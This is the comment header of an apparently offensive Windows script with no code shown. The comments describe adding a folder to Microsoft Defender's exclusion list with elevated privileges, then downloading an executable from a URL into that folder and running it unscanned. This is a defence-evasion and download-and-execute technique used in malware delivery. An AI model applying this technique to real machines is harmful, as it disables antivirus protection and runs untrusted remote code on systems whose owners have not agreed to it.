#This script is just an idea that we can add any folder into an exclusion of Mircrosoft Defender!!!
#It means that anything downloaded in that excluded folder or executed from that folder will not be scanned by Microsoft Defender!!!
#Needs elevated privilege
#Works only on Microsoft Defender
#Here we are creating an excluded folder, downloading an exe into that folder from a url and exeuting it.
